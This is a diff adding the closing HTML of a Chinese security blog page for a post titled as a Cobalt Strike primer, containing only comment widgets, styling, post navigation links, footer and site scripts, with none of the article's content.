+        id: '2020/11/27/cobalstrike-sao-mang/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+    <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '',
+        appKey: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'false' === 'true',
+        avatar: 'wavatar',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/11/27/cobalstrike-sao-mang/">
+                    <div class="card-image">
+                        
+                        <img src="/img/CobalStrikeLiteracy/0.6533318592180974.png" class="responsive-img" alt="CobalStrike扫盲">
+                        
+                        <span class="card-title">CobalStrike扫盲</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CobalStrike扫盲
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CobalStrike/" class="post-category" target="_blank">
+                                    CobalStrike
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CobalStrike扫盲/" target="_blank">
+                        <span class="chip bg-color">CobalStrike扫盲</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/">
+                    <div class="card-image">
+                        
+                        <img src="/img/360SafeBrowser/660487aa-9ac7-4627-a060-e21cbb7fa3a7.png" class="responsive-img" alt="动态调试360安全浏览器获取密钥">
+                        
+                        <span class="card-title">动态调试360安全浏览器获取密钥</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            动态调试360安全浏览器获取密钥
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/逆向/" class="post-category" target="_blank">
+                                    逆向
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/动态调试360安全浏览器获取密钥/" target="_blank">
+                        <span class="chip bg-color">动态调试360安全浏览器获取密钥</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: ske的博客<br />'
+            + '作者: ske<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    
+
+</main>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; 2020-~ Ske. 版权所有
+
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+            <span class="white-color">13.3k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+			<span id="busuanzi_container_site_pv" style='display:none'>
+				<i class="fa fa-heart-o"></i>
+				
+			</span>
+			
+			
+			<span id="busuanzi_container_site_uv" style='display:none'>
+				
+			</span>
+			
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SkewwG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:446106525@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=446106525&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2020, 11, 25, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);
+        var pvcountOffset = 80000;
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    
+    <script src="/libs/others/clicklove.js"></script>
+    
+
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+</body>
+
+</html>
